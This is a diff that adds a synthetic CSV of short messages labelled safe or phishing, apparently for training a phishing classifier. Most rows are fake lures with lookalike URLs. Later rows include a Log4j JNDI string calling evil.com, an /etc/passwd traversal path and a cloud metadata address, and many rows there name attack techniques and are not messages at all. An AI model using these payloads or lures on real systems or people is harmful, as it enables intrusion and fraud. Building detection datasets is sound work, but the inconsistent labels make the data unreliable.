@@ -1,0 +1,907 @@
+text,label
+"Hi John, please find the meeting notes attached from yesterday's standup. Let me know if you have questions.",safe
+"Dear customer, your account has been suspended. Click here immediately to verify: http://fake-bank-login.xyz/verify",phishing
+"Reminder: team lunch on Friday at noon in the cafeteria.",safe
+"URGENT: Unusual activity detected on your PayPal account. Confirm your password now at www.secure-paypal-update.com",phishing
+"Can you review the quarterly report draft I shared on SharePoint?",safe
+"Congratulations! You won $1,000,000! Wire transfer fee required. Act now - limited time offer!!!",phishing
+"Mom called - dinner is at 7pm tonight. See you then!",safe
+"Security Alert: Your Microsoft 365 credentials expired. Update here: http://micros0ft-login.support/reset",phishing
+"Please approve the expense report by end of day Thursday.",safe
+"Your Amazon order could not be delivered. Click to update payment: http://amazon-delivery-fix.ru/update",phishing
+"Happy birthday! Hope you have a wonderful day.",safe
+"IRS NOTICE: You owe back taxes. Pay immediately via Bitcoin to avoid arrest. Contact agent now.",phishing
+"The project timeline has been updated in Jira - no action needed from you.",safe
+"Netflix: Your subscription was declined. Re-enter card details at http://netflix-billing-secure.co/login",phishing
+"Thanks for submitting your application. We will respond within 5 business days.",safe
+"Apple ID locked due to suspicious sign-in from Russia. Unlock account: http://apple-id-unlock.info",phishing
+"Office closed Monday for the holiday. Enjoy the long weekend!",safe
+"Invoice #8842 overdue. Open attachment to view PDF and pay via wire transfer today.",phishing
+"Your package from FedEx is waiting. Track at fedex.com with tracking number 1234567890.",safe
+"FREE iPhone 15! You are selected winner. Claim prize: http://prize-claim-now.biz/winner",phishing
+"Schedule your annual physical exam - call the clinic to book.",safe
+"Bank of America: Confirm your identity or account will be closed in 24 hours. http://boa-verify-account.net",phishing
+"New blog post published on the company intranet about remote work policy.",safe
+"LinkedIn: Someone viewed your profile 47 times. Premium required. Click: http://linkedin-premium-fake.io",phishing
+"Please bring your ID to the front desk for badge renewal.",safe
+"Chase Bank alert: Unauthorized wire transfer attempted. Verify now: http://chase-secure-login.cc/auth",phishing
+"Your GitHub pull request #42 has been approved and merged.",safe
+"Dropbox shared folder expires today. Re-authenticate: http://dropbox-auth-renewal.xyz/signin",phishing
+"Class cancelled tomorrow due to instructor illness.",safe
+"Wells Fargo: Your debit card blocked. Call 1-800-FAKE or click http://wellsfargo-card-unlock.ru",phishing
+"Attached is the signed contract for your review.",safe
+"Coinbase: Withdrawal pending approval. Confirm wallet at http://coinbase-wallet-verify.io",phishing
+"Reminder to submit timesheet by 5pm Friday.",safe
+"DHL shipment held at customs. Pay $2.99 fee: http://dhl-customs-payment.biz/pay",phishing
+"Your dentist appointment is confirmed for Tuesday 3pm.",safe
+"Google Drive: Storage full. Upgrade or lose files. http://google-drive-upgrade.co/login",phishing
+"Welcome to the newsletter! Unsubscribe anytime from footer link.",safe
+"WhatsApp: Voice message from unknown contact. Listen: http://whatsapp-voice-msg.tk/play",phishing
+"Parking permit renewal instructions are on the HR portal.",safe
+"eBay: Buyer paid for item. Confirm shipping address: http://ebay-seller-confirm.net/ship",phishing
+"Lab results are available in your patient portal - login required.",safe
+"Spotify Premium expired. Renew billing: http://spotify-billing-update.co/account",phishing
+"Book club meets next Wednesday - we're reading chapter 5.",safe
+"Twitter/X: Your account violated terms. Appeal within 1 hour: http://twitter-appeal-form.xyz",phishing
+"Insurance policy documents attached for annual renewal.",safe
+"Western Union: Transfer ready for pickup. Provide SSN and PIN at http://wu-transfer-claim.biz",phishing
+"Your Uber receipt for trip on March 12 is attached.",safe
+"Adobe Creative Cloud payment failed. Update card: http://adobe-payment-fix.ru/billing",phishing
+"Volunteer signup sheet for the community event is live.",safe
+"Steam: Unusual login from China. Secure account: http://steam-guard-reset.info/login",phishing
+"Please update your emergency contact info in the employee portal.",safe
+"DocuSign: Document awaiting signature. Sign now: http://docusign-fake-sign.co/sign/abc123",phishing
+"Your library book is due in 3 days.",safe
+"AT&T: Bill overdue $89.99. Pay now or service disconnected: http://att-bill-pay.xyz",phishing
+"Conference registration confirmed - see you in Austin!",safe
+"Instagram: Copyright violation on your post. Appeal or account deleted: http://ig-appeal-form.tk",phishing
+"Please review the updated employee handbook.",safe
+"USPS: Package delivery failed. Reschedule: http://usps-redelivery-scam.co/track",phishing
+"Your prescription is ready for pickup at CVS.",safe
+"Zoom: Meeting link expired. Rejoin with password: http://zoom-meeting-join.biz/meet",phishing
+"Salary direct deposit processed - check your bank statement.",safe
+"Bitwarden: Master password compromised. Reset immediately: http://bitwarden-reset-fake.io",phishing
+"New comment on your shared document in Google Docs.",safe
+"Shopify store suspended. Verify merchant identity: http://shopify-merchant-verify.net",phishing
+"Yoga class moved to Room 204 this week.",safe
+"Venmo: $500 sent to you. Accept payment: http://venmo-payment-accept.co/claim",phishing
+"IT maintenance window Saturday 2am-4am - brief outage expected.",safe
+"TurboTax: Refund delayed. Verify SSN and bank routing: http://turbotax-refund-verify.ru",phishing
+"Your child's school permission slip is due Friday.",safe
+"Mastercard: Fraud alert on card ending 4521. Confirm at http://mastercard-fraud-alert.biz",phishing
+"Team building event photos uploaded to shared drive.",safe
+"Slack: Workspace billing failed. Update payment: http://slack-billing-update.co/admin",phishing
+"Please sign the NDA before the vendor call Monday.",safe
+"OpenAI: API key exposed publicly. Rotate key: http://openai-key-rotate-scam.io/keys",phishing
+"Your gym membership renews automatically next month.",safe
+"Walmart: Order #99281 cancelled. Reorder: http://walmart-order-fix.net/cart",phishing
+"Flight itinerary for your trip to Denver is attached.",safe
+"Bank transfer of $50,000 pending your approval. Urgent wire instructions inside.",phishing
+"Neighborhood HOA meeting minutes from last month.",safe
+"Facebook: Friend request from hacker. Your account hacked. Recover: http://fb-account-recover.xyz",phishing
+"Please complete the annual security awareness training by month end.",safe
+"Ransomware detected on your PC. Pay 2 BTC to decrypt: http://decrypt-files-now.onion/pay",phishing
+"Your car service appointment is Tuesday 9am.",safe
+"Costco: Membership renewal failed. Update payment http://costco-member-renew.co",phishing
+"New JavaScript library release notes in the dev channel.",safe
+"HR: Bonus deposited. Confirm bank for direct deposit: http://hr-bonus-verify.biz",phishing
+"Weather alert: thunderstorms expected this afternoon.",safe
+"Target: RedCard payment declined. Fix billing http://target-redcard-update.ru",phishing
+"Code review feedback posted on PR #108.",safe
+"Cryptocurrency investment guaranteed 500% return. Bitcoin wallet inside. Act now!",phishing
+"Your subscription to The Economist renews next week.",safe
+"SAP: License expired. Renew or lose access: http://sap-license-renewal.co/login",phishing
+"Please pick up dry cleaning - ticket attached.",safe
+"Oracle Cloud: Instance terminated. Restore data: http://oracle-cloud-restore.biz",phishing
+"Board meeting agenda for Q2 review attached.",safe
+"Salesforce: Admin login from unknown IP. Reset password: http://salesforce-admin-reset.io",phishing
+"Your vet appointment reminder for next Monday.",safe
+"GitLab: Repository made public accidentally. Revert: http://gitlab-repo-private.xyz",phishing
+"Parking ticket payment instructions - city website only.",safe
+"AWS: Account compromised. Rotate root keys: http://aws-root-key-rotate-scam.co",phishing
+"Recipe for the potluck shared in the group chat.",safe
+"Jira: License audit failed. Pay invoice: http://jira-license-audit.net/pay",phishing
+"Your passport renewal application status update.",safe
+"Notion: Workspace deleted in 24h. Upgrade plan: http://notion-upgrade-scam.co",phishing
+"College alumni event registration open.",safe
+"Figma: Team invite from unknown user. Accept: http://figma-team-invite.tk/join",phishing
+"Water bill payment confirmation - thank you.",safe
+"Twilio: Account suspended for spam. Appeal: http://twilio-appeal-form.biz",phishing
+"New parking policy effective next month.",safe
+"Mailchimp: Campaign blocked. Verify sender: http://mailchimp-sender-verify.ru",phishing
+"Your tax documents are ready for download in secure portal.",safe
+"Heroku: App dyno billing failed. Update card http://heroku-billing-fix.co",phishing
+"Soccer practice cancelled due to rain.",safe
+"DigitalOcean: Droplet hacked. Secure now: http://do-droplet-secure.xyz",phishing
+"Please review benefits enrollment options by deadline.",safe
+"Square: Chargeback on your account. Dispute: http://square-chargeback-fake.io",phishing
+"Your wine club shipment ships tomorrow.",safe
+"Stripe: Payout held. Verify business: http://stripe-payout-verify.biz",phishing
+"Neighborhood watch meeting Thursday 7pm.",safe
+"HubSpot: CRM data export ready. Download: http://hubspot-export-malware.co/file.exe",phishing
+"Your piano lesson is rescheduled to 4pm.",safe
+"Okta: SSO login failed. Reset MFA: http://okta-mfa-reset-scam.net",phishing
+"Garden club plant sale this weekend.",safe
+"1Password: Vault sync error. Re-enter master password: http://1password-vault-sync.io",phishing
+"Your museum membership card is attached.",safe
+"Cloudflare: DNS hijacked. Fix nameservers: http://cloudflare-dns-fix.co",phishing
+"Book returned to library - no fines due.",safe
+"Datadog: Alert billing spike. Confirm payment: http://datadog-billing-alert.biz",phishing
+"Your plumber confirmed appointment for Thursday.",safe
+"PagerDuty: On-call override request. Approve: http://pagerduty-override-scam.co",phishing
+"Summer camp registration opens Monday 9am.",safe
+"LastPass: Security breach. Change master password: http://lastpass-breach-reset.ru",phishing
+"Your HOA dues receipt for Q1.",safe
+"Auth0: Tenant locked. Pay overdue invoice: http://auth0-tenant-unlock.xyz",phishing
+"Your optometrist prescription expires - schedule exam.",safe
+"Firebase: Project quota exceeded. Upgrade: http://firebase-upgrade-scam.co",phishing
+"Church potluck sign-up sheet attached.",safe
+"MongoDB Atlas: Cluster exposed publicly. Secure: http://mongodb-atlas-secure.biz",phishing
+"Your driver's license renewal reminder from DMV.",safe
+"Redis Cloud: Memory limit hit. Upgrade plan http://redis-cloud-billing.co",phishing
+"Scout troop camping trip permission form.",safe
+"Elastic: License key invalid. Renew: http://elastic-license-renew.ru",phishing
+"Your dental cleaning is scheduled for May 15.",safe
+"Kubernetes: Cluster admin access granted to unknown user. Revoke: http://k8s-admin-revoke.tk",phishing
+"PTA fundraiser thank you letter.",safe
+"Snowflake: Warehouse billing anomaly. Verify: http://snowflake-billing-verify.co",phishing
+"Your pet's vaccination record attached.",safe
+"Tableau: Subscription lapsed. Renew: http://tableau-renew-scam.io",phishing
+"Block party cleanup volunteer list.",safe
+"Power BI: Report shared externally. Revoke access: http://powerbi-revoke-access.biz",phishing
+"Your massage appointment confirmed Saturday 2pm.",safe
+"Splunk: Log ingestion stopped. Fix license: http://splunk-license-fix.co",phishing
+"Neighborhood garage sale map attached.",safe
+"Confluence: Space deleted. Restore: http://confluence-space-restore.xyz",phishing
+"Your tutoring session notes from last week.",safe
+"Bitbucket: Repo made public. Make private: http://bitbucket-repo-private.ru",phishing
+"Farmers market vendor application approved.",safe
+"CircleCI: Build secrets leaked. Rotate tokens: http://circleci-token-rotate-scam.co",phishing
+"Your acupuncture appointment reminder.",safe
+"Travis CI: Build failed - malicious config. Fix: http://travis-ci-config-fix.biz",phishing
+"Choir rehearsal moved to chapel.",safe
+"Jenkins: Admin password reset required: http://jenkins-admin-reset.io",phishing
+"Your swimming lesson is at 5pm pool 2.",safe
+"Ansible Tower: Job template hijacked. Review: http://ansible-tower-alert.co",phishing
+"Art gallery opening invitation Friday.",safe
+"Terraform Cloud: State file exposed. Secure: http://terraform-state-secure.xyz",phishing
+"Your cooking class ingredients list attached.",safe
+"Vault: Unseal keys compromised. Rotate: http://vault-unseal-rotate-scam.net",phishing
+"Community theater audition times posted.",safe
+"Consul: Service mesh breached. Patch: http://consul-mesh-patch.biz",phishing
+"Your hiking group meetup is Sunday 8am trailhead.",safe
+"Nomad: Job allocation failed - pay cluster fee: http://nomad-cluster-fee.co",phishing
+"Wine tasting event tickets attached.",safe
+"Prometheus: Alertmanager config tampered. Fix: http://prometheus-config-fix.ru",phishing
+"Your photography workshop materials list.",safe
+"Grafana: Dashboard public URL leaked. Revoke: http://grafana-dashboard-revoke.io",phishing
+"Bird watching club field trip Saturday.",safe
+"InfluxDB: Retention policy deleted data. Restore: http://influxdb-restore-scam.co",phishing
+"Your chess club tournament bracket.",safe
+"RabbitMQ: Queue poison message. Clear: http://rabbitmq-queue-clear.biz",phishing
+"Knitting circle pattern for April attached.",safe
+"Kafka: Consumer lag critical. Pay support: http://kafka-support-fee.xyz",phishing
+"Your running club 5K registration confirmed.",safe
+"Nginx: Config syntax error - remote fix: http://nginx-remote-fix.tk",phishing
+"Pottery class glaze firing schedule.",safe
+"HAProxy: Backend down. Emergency config: http://haproxy-emergency-config.co",phishing
+"Your astronomy club star party invite.",safe
+"Envoy: mTLS cert expired. Renew: http://envoy-mtls-renew.ru",phishing
+"Sailing lesson weather cancellation notice.",safe
+"Istio: Sidecar injection failed. Patch: http://istio-sidecar-patch.biz",phishing
+"Your book club wine pairing suggestions.",safe
+"Linkerd: Proxy cert stolen. Rotate: http://linkerd-cert-rotate-scam.io",phishing
+"Fencing tournament schedule attached.",safe
+"Cilium: Network policy bypass detected. Fix: http://cilium-policy-fix.co",phishing
+"Your meditation retreat packing list.",safe
+"Calico: BGP session hijacked. Secure: http://calico-bgp-secure.xyz",phishing
+"Archery range safety briefing reminder.",safe
+"Flannel: VXLAN tunnel compromised. Rebuild: http://flannel-tunnel-rebuild.biz",phishing
+"Your language exchange partner intro email.",safe
+"Weave: DNS rebinding attack. Patch now: http://weave-dns-patch.ru",phishing
+"Origami workshop supplies to bring.",safe
+"CoreDNS: Zone transfer allowed. Lock down: http://coredns-zone-lock.co",phishing
+"Your genealogy research document share.",safe
+"etcd: Cluster quorum lost. Recover keys: http://etcd-quorum-recover-scam.net",phishing
+"Beekeeping club hive inspection Saturday.",safe
+"Zookeeper: znode ACL misconfigured. Fix: http://zookeeper-acl-fix.io",phishing
+"Your calligraphy pen order shipped.",safe
+"Consul Connect: Intentions bypassed. Audit: http://consul-connect-audit.biz",phishing
+"Stargazing meteor shower watch party.",safe
+"Traefik: Middleware chain RCE. Patch: http://traefik-rce-patch.co",phishing
+"Your pottery kiln firing results.",safe
+"Caddy: Auto HTTPS cert stolen. Reissue: http://caddy-cert-reissue.xyz",phishing
+"Folk dance festival lineup attached.",safe
+"Apache: mod_status exposed. Disable: http://apache-modstatus-fix.ru",phishing
+"Your mushroom foraging safety guidelines.",safe
+"Tomcat: Manager app default creds. Change: http://tomcat-manager-fix.biz",phishing
+"Quilting bee block exchange instructions.",safe
+"WildFly: Admin console open to internet. Close: http://wildfly-admin-close.co",phishing
+"Your sourdough starter feeding schedule.",safe
+"Jetty: JMX port exposed. Secure: http://jetty-jmx-secure.io",phishing
+"Bonsai pruning workshop reminder.",safe
+"GlassFish: Domain password reset phishing link inside - ignore and delete.",phishing
+"Your telescope collimation guide attached.",safe
+"Resin: Cluster join token leaked. Rotate: http://resin-token-rotate-scam.net",phishing
+"Community garden plot assignment.",safe
+"WebLogic: Console brute force detected. Lock: http://weblogic-console-lock.biz",phishing
+"Your harmonica lesson sheet music.",safe
+"JBoss: Deserialization RCE patch needed: http://jboss-deser-patch.co",phishing
+"Falconry demonstration tickets attached.",safe
+"PayPal: You received $200. Claim: http://paypal-claim-money.xyz",phishing
+"Your knitting pattern for the charity blanket.",safe
+"eBay: Second chance offer on item you bid on. Pay: http://ebay-second-chance.ru",phishing
+"Local bakery order ready for pickup.",safe
+"Microsoft: Unusual sign-in. Was this you? http://microsoft-unusual-signin.co",phishing
+"Your car registration renewal notice.",safe
+"Apple: Purchase of $999 iPhone on your card. Dispute: http://apple-dispute-charge.biz",phishing
+"Neighborhood block party flyer.",safe
+"Google: New device added to account. Remove: http://google-device-remove.io",phishing
+"Your piano tuner appointment Friday.",safe
+"Amazon: Prime membership cancelled. Reactivate: http://amazon-prime-reactivate.tk",phishing
+"Volunteer fire department training schedule.",safe
+"Netflix: Account sharing detected. Upgrade plan: http://netflix-sharing-upgrade.co",phishing
+"Your fishing license renewal online.",safe
+"Spotify: Family plan member removed you. Rejoin: http://spotify-family-rejoin.ru",phishing
+"Community choir concert program.",safe
+"Instagram: Copyright strike. Account deleted in 48h. Appeal: http://instagram-copyright-appeal.biz",phishing
+"Your horse riding lesson cancelled rain.",safe
+"WhatsApp: Your account will be deleted. Verify: http://whatsapp-verify-account.xyz",phishing
+"Local library book club selection.",safe
+"Telegram: Login code 847291. Do not share. (This is a legitimate-style safe message)",safe
+"Telegram: Your account expires. Verify phone: http://telegram-verify-phone.co",phishing
+"Your ceramics glaze test results.",safe
+"Discord: Nitro gift from stranger. Claim: http://discord-nitro-gift.ru",phishing
+"Woodworking club tool safety refresher.",safe
+"Steam: Free game key GRAB-NOW. Redeem: http://steam-free-key.biz",phishing
+"Your birdhouse building plans attached.",safe
+"Epic Games: Fortnite V-Bucks giveaway. Login: http://fortnite-vbucks-free.io",phishing
+"Community pool opening day schedule.",safe
+"Roblox: Account terminated for exploits. Appeal: http://roblox-appeal-form.co",phishing
+"Your sourdough bread competition entry confirmed.",safe
+"Minecraft: Hypixel ban appeal. Pay $5: http://minecraft-ban-appeal.xyz",phishing
+"Local farmers cooperative meeting minutes.",safe
+"PlayStation: PSN account locked. Unlock: http://psn-account-unlock.ru",phishing
+"Your watercolor paint order confirmation.",safe
+"Xbox: Game Pass expired. Renew: http://xbox-gamepass-renew.biz",phishing
+"Town hall budget hearing agenda.",safe
+"Nintendo: eShop balance transfer. Confirm: http://nintendo-eshop-transfer.co",phishing
+"Your embroidery hoop size guide.",safe
+"Twitch: Partner revenue held. Verify tax: http://twitch-partner-verify.io",phishing
+"Scout merit badge counselor list.",safe
+"YouTube: Channel demonetized. Appeal: http://youtube-demonetize-appeal.tk",phishing
+"Your leather crafting tool catalog.",safe
+"TikTok: Viral video prize. Claim $5000: http://tiktok-prize-claim.ru",phishing
+"Neighborhood watch crime stats report.",safe
+"Reddit: Moderator access revoked. Restore: http://reddit-mod-restore.biz",phishing
+"Your candle making wax temperature chart.",safe
+"Pinterest: Business account suspended. Verify: http://pinterest-business-verify.co",phishing
+"Local museum volunteer orientation.",safe
+"Snapchat: Memories deleted. Recover: http://snapchat-memories-recover.xyz",phishing
+"Your soap making lye safety sheet.",safe
+"LinkedIn: Job offer requires upfront training fee. Wire $500 today.",phishing
+"Community theater costume fitting.",safe
+"Indeed: Employer wants SSN before interview. Send to hr-scam@fake-jobs.com",phishing
+"Your bee hive winter preparation checklist.",safe
+"Glassdoor: Company review removed. Pay to restore: http://glassdoor-review-restore.io",phishing
+"Local food bank donation drive flyer.",safe
+"Upwork: Client overpaid. Refund difference via Zelle to personal account.",phishing
+"Your telescope mirror cleaning guide.",safe
+"Fiverr: Account verification fee $25 required to withdraw earnings.",phishing
+"Church newsletter Easter service times.",safe
+"Freelancer.com: Project escrow release - click to send bank login.",phishing
+"Your pottery wheel maintenance log.",safe
+"Remote job: Data entry $5000/week. Send $200 for equipment deposit first.",phishing
+"School board meeting public comment signup.",safe
+"Work from home: Envelope stuffing $80/hour. Purchase starter kit $149.",phishing
+"Your calligraphy ink mixing ratios.",safe
+"Mystery shopper assignment - cash check and wire 90% back.",phishing
+"PTA newsletter spring fundraiser results.",safe
+"Nigerian prince inheritance - need your bank account to transfer $10M.",phishing
+"Your hiking trail map for weekend trip.",safe
+"Romance scam: military deployed overseas needs iTunes gift cards urgently.",phishing
+"Local blood drive appointment slots.",safe
+"Tech support: Your computer infected. Call 1-888-SCAM-NOW or install remote access.",phishing
+"Your garden compost turning schedule.",safe
+"IRS refund deposited $4,382 - click to confirm direct deposit account details.",phishing
+"Neighborhood picnic signup sheet.",safe
+"Social Security: Benefits suspended. Call immediately or click http://ssa-benefits-restore.co",phishing
+"Your dog training class homework.",safe
+"Medicare: New card required. Provide Medicare number and DOB online.",phishing
+"Community orchestra rehearsal schedule.",safe
+"COVID vaccine appointment - free at http://fake-vaccine-site.ru/register",phishing
+"Your cat's vet vaccination certificate.",safe
+"Weight loss miracle pill 30lbs in 7 days. Order now 50% off!!!",phishing
+"Local running race bib pickup info.",safe
+"Pharmacy: Prescription ready. Pay copay via gift card to avoid delay.",phishing
+"Your sourdough discard recipe collection.",safe
+"CBD oil cures cancer FDA approved. Buy now limited stock!",phishing
+"Book club next read: normal literary fiction title.",safe
+"Student loan forgiveness approved - pay $99 processing fee today.",phishing
+"Your watercolor paper weight comparison chart.",safe
+"Credit repair: Delete all bad credit in 30 days. Pay $299 upfront.",phishing
+"Town recycling schedule update.",safe
+"Debt consolidation: Stop all payments send one check to P.O. Box scam.",phishing
+"Your telescope eyepiece collection inventory.",safe
+"Payday loan guaranteed approval no credit check. APR 400%. Apply now!",phishing
+"Community garden compost delivery Tuesday.",safe
+"Car warranty expired final notice. Call 888-555-SCAM to extend.",phishing
+"Your pottery class final project photos.",safe
+"Solar panels government rebate - pay $5000 deposit get $20000 back.",phishing
+"Local jazz festival lineup announced.",safe
+"Timeshare exit fee $2999 - we guarantee cancellation or money back.",phishing
+"Your embroidery thread color chart.",safe
+"Grant money available $25000 - pay $199 application fee to receive.",phishing
+"Neighborhood holiday lights contest rules.",safe
+"Charity: Donate Bitcoin to help orphans - wallet address inside suspicious link.",phishing
+"Your bird watching life list update.",safe
+"Lottery UK National - you won! Pay customs fee $500 to release funds.",phishing
+"School supply list for fall semester.",safe
+"Inheritance from unknown relative - attorney needs your bank details.",phishing
+"Your harmonica tab for Amazing Grace.",safe
+"Package delivery from Amazon - wrong link http://amaz0n-parcel.info/track",phishing
+"Community cleanup day volunteer thank you.",safe
+"CEO fraud: Wire $50000 to new vendor account today before market close urgent.",phishing
+"Your knitting gauge swatch instructions.",safe
+"Vendor invoice changed bank details - please update payment to new account.",phishing
+"Local theater season ticket renewal.",safe
+"BEC: Kindly process urgent wire transfer attached PDF password is 1234.",phishing
+"Your sourdough hydration percentage log.",safe
+"Fake CEO: I am in meeting send gift cards to clients scan QR code.",phishing
+"Farmers market vendor map for Saturday.",safe
+"Supply chain: Urgent PO change wire payment to offshore account.",phishing
+"Your calligraphy practice drills attached.",safe
+"HR direct deposit form updated - submit SSN and routing via http://hr-deposit-form.co",phishing
+"Scout camp packing list for summer.",safe
+"IT helpdesk: Password expired. Reset at http://it-password-reset-fake.net",phishing
+"Your pottery glaze test tile photos.",safe
+"VPN required: Install http://company-vpn-download.xyz/setup.exe immediately.",phishing
+"Community choir holiday concert invite.",safe
+"Malware: Invoice attached invoice.exe open to view payment details.",phishing
+"Your telescope finder scope alignment guide.",safe
+"Ransomware: All files encrypted pay 1 Bitcoin to decrypt@evil.onion",phishing
+"Local library story time schedule.",safe
+"Keylogger: Your password was stolen. Download cleaner http://password-cleaner.biz",phishing
+"Your watercolor landscape reference photos.",safe
+"Fake antivirus: 847 viruses found. Purchase license http://fake-antivirus.co",phishing
+"Neighborhood watch annual meeting agenda.",safe
+"Cryptojacking: Your browser mining Monero. Fix: http://browser-mining-stop.ru",phishing
+"Your embroidery hoop tension tips.",safe
+"SIM swap: Your mobile number ported. Call attacker-controlled number.",phishing
+"Community pool lifeguard schedule.",safe
+"Smishing: USPS package http://usps.malicious-link.tk reply STOP to cancel",phishing
+"Your sourdough starter naming contest results.",safe
+"Vishing: IRS calling arrest warrant pay with prepaid cards now.",phishing
+"Local bakery wedding cake tasting confirmed.",safe
+"Quishing: QR code on parking ticket links to http://parking-fine-pay.scam",phishing
+"Your birdhouse camera setup guide.",safe
+"Deepfake CEO video call wire transfer authorized - process immediately.",phishing
+"Woodworking club project plans shared.",safe
+"AI voice clone: Mom in accident send money Western Union urgent.",phishing
+"Your pottery kiln cone chart.",safe
+"Fake 2FA: Microsoft Authenticator reset required http://mfa-reset-scam.co",phishing
+"Community garden spring planting guide.",safe
+"OAuth phishing: Grant app FullAccess permissions to unknown third party.",phishing
+"Your harmonica blues scale exercises.",safe
+"Session hijack: Click to restore session http://session-restore-phish.io",phishing
+"Local museum docent training schedule.",safe
+"Formjacking: Your credit card was captured on checkout - verify at fake site.",phishing
+"Your knitting cable pattern chart.",safe
+"Watering hole: Industry conference site compromised download agenda.pdf.exe",phishing
+"Town parade route map attached.",safe
+"Typosquatting: Login at http://gooogle.com/signin instead of google.com",phishing
+"Your sourdough scoring pattern gallery.",safe
+"Homograph: PayPal at http://раypal.com (Cyrillic a) verify account.",phishing
+"Community orchestra string section roster.",safe
+"Subdomain takeover: Login at http://login.company-evil.co",phishing
+"Your calligraphy flourishing examples.",safe
+"Pastejacking: Ctrl+V installs malware from clipboard - run fix script.",phishing
+"Scout troop camping gear checklist.",safe
+"Tabnabbing: Bank tab replaced while you were away - re-login required fake page.",phishing
+"Your pottery trimming tools care guide.",safe
+"Clickjacking: Invisible button over real site steals Facebook like.",phishing
+"Local food co-op member meeting.",safe
+"Malvertising: Flash player update required http://flash-update-virus.co",phishing
+"Your telescope collimation laser guide.",safe
+"Drive-by download: Visit http://free-movies-no-signup.ru for exploit kit.",phishing
+"Neighborhood block party cleanup crew.",safe
+"SQL injection lesson: normal database course email with no malicious links.",safe
+"Your watercolor wet-on-wet technique notes.",safe
+"XSS payload in email: script alert document cookie - training sample only.",safe
+"Community choir warm-up exercises attached.",safe
+"CSRF: Click to transfer funds without your knowledge http://bank-csrf-demo.co",phishing
+"Your embroidery stabilizer selection guide.",safe
+"IDOR: User profile 12345 exposed at http://app.com/user/12345 - security report.",safe
+"Local running club pace groups.",safe
+"Path traversal: Download ../../../etc/passwd from http://vuln-file-server.biz",phishing
+"Your sourdough autolyse timing chart.",safe
+"SSRF: Internal metadata http://169.254.169.254/ exposed via webhook.",phishing
+"Farmers market organic produce list.",safe
+"XXE: Parse XML external entity in attachment - malicious sample for lab.",phishing
+"Your bird feeder cleaning schedule.",safe
+"Deserialization: Java object stream in attachment run calc.exe.",phishing
+"Pottery class open studio hours.",safe
+"Prototype pollution: JSON config merge vulnerability PoC email.",safe
+"Your harmonica bending practice log.",safe
+"Log4j: ${jndi:ldap://evil.com/a} in subject line - attack simulation.",phishing
+"Community theater prop list.",safe
+"Spring4Shell: Deploy WAR shell via classloader - security research notice.",phishing
+"Your knitting yarn weight conversion table.",safe
+"Heartbleed: OpenSSL memory leak scan your server - fake remediation tool link.",phishing
+"Local jazz jam session signup.",safe
+"Shellshock: Bash environment exploit test CGI script.",phishing
+"Your telescope dew heater setup.",safe
+"EternalBlue: SMBv1 exploit patch reminder from fake Microsoft.",phishing
+"Woodworking safety goggles reminder.",safe
+"WannaCry: Decrypt files pay Bitcoin - classic ransomware template.",phishing
+"Your sourdough cold retard schedule.",safe
+"NotPetya: Tax payment due open attached executable.",phishing
+"Community garden rain barrel workshop.",safe
+"SolarWinds: Orion update from http://orion-update-supply-chain.ru",phishing
+"Your calligraphy pen nib comparison.",safe
+"Colonial Pipeline: Urgent fuel shortage pay ransom.",phishing
+"Scout merit badge requirements update.",safe
+"Log4Shell patch: Download fake patch http://log4j-patch-download.co",phishing
+"Your pottery wheel speed settings.",safe
+"ProxyLogon: Exchange server zero-day exploit notification fake.",phishing
+"Neighborhood holiday decoration contest.",safe
+"PrintNightmare: Printer driver RCE install http://print-spooler-fix.biz",phishing
+"Your watercolor brush care instructions.",safe
+"Zerologon: Domain admin compromise scan http://zerologon-check.ru",phishing
+"Local blood drive thank you volunteers.",safe
+"Follina: MSDT ms-msdt exploit in Word doc - open attachment.",phishing
+"Your embroidery machine tension settings.",safe
+"SpringShell: Spring Framework RCE patch now http://spring-patch-scam.co",phishing
+"Community pool chemical safety sheet.",safe
+"Dirty Pipe: Linux kernel privilege escalation PoC download.",phishing
+"Your sourdough oven spring troubleshooting.",safe
+"Spectre Meltdown: CPU vulnerability pay for patch tool.",phishing
+"Town council zoning hearing notice.",safe
+"Rowhammer: RAM bit flip attack hardware sale scam.",phishing
+"Your bird watching eBird checklist export.",safe
+"Meltdown: Intel CPU bug fix download http://intel-cpu-fix-malware.io",phishing
+"Local museum exhibit opening reception.",safe
+"BlueKeep: RDP vulnerability remote desktop patch fake link.",phishing
+"Your harmonica repair kit contents.",safe
+"Debian SSH weak keys regenerate - phishing IT notice.",phishing
+"Community orchestra concert dress code.",safe
+"Heartbleed openssl upgrade: http://openssl-upgrade-scam.co/download",phishing
+"Your knitting blocking mat instructions.",safe
+"POODLE SSLv3 downgrade attack - disable SSL fake guide with malware.",phishing
+"Farmers market honey vendor list.",safe
+"BEAST TLS 1.0 attack mitigation tool download scam.",phishing
+"Your pottery gas kiln ventilation checklist.",safe
+"CRIME TLS compression attack - install browser extension malware.",phishing
+"Scout camping leave-no-trace reminder.",safe
+"BREACH HTTP compression attack - corporate security fake alert wire money.",phishing
+"Your telescope motor drive calibration.",safe
+"FREAK export cipher downgrade - patch now malicious link.",phishing
+"Local theater audition callback list.",safe
+"Logjam DH parameter attack - update Java fake installer.",phishing
+"Your sourdough starter smell troubleshooting.",safe
+"Sweet32 birthday attack on 3DES - banking alert phishing.",phishing
+"Community garden compost tea recipe.",safe
+"DROWN SSLv2 cross-protocol attack - renew certificate scam site.",phishing
+"Your calligraphy ink dilution ratios.",safe
+"ROBOT Bleichenbacher oracle RSA - TLS patch phishing.",phishing
+"Neighborhood watch flashlight drive.",safe
+"EFAIL PGP email decryption leak - install fake Enigmail update.",phishing
+"Your watercolor masking fluid techniques.",safe
+"SigSpoof GnuPG signature bypass - download compromised GPG.",phishing
+"Woodworking dust collection maintenance.",safe
+"Thunderbolt DMA attack hardware lock sale scam.",phishing
+"Your embroidery digitizing software tips.",safe
+"BadUSB firmware reprogram USB drive - free branded drives mail scam.",phishing
+"Local jazz festival volunteer schedule.",safe
+"USB killer device shipped - pay customs fee phishing.",phishing
+"Your pottery pug mill cleaning procedure.",safe
+"Juice jacking public USB port malware - airport charging station alert fake.",phishing
+"Community choir section leader assignments.",safe
+"SIM card swap authorization form - fill SSN online phishing.",phishing
+"Your birdhouse predator guard installation.",safe
+"Stingray IMSI catcher detected - buy anti-surveillance device scam.",phishing
+"Town parade float construction schedule.",safe
+"SS7 routing vulnerability - secure your phone pay fee phishing.",phishing
+"Your harmonica reed plate replacement.",safe
+"Fake cell tower detected - install security app malware.",phishing
+"Local bakery custom cake order confirmed.",safe
+"WiFi pineapple evil twin - connect to FREE_AIRPORT_WIFI phishing portal.",phishing
